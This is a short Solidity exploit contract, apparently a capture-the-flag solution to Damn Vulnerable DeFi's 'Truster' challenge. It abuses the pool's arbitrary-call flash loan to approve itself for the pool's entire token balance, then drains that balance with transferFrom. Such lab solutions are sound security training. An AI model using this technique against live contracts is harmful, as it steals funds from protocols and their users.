// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackContract {
    function attack(address _pool, address _token) public {
        TrusterLenderPool trusterLenderPool = TrusterLenderPool(_pool);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            IERC20(_token).balanceOf(_pool)
        );
        trusterLenderPool.flashLoan(0, msg.sender, address(_token), data);
        IERC20(_token).transferFrom(
            address(_pool),
            msg.sender,
            IERC20(_token).balanceOf(_pool)
        );
    }
}
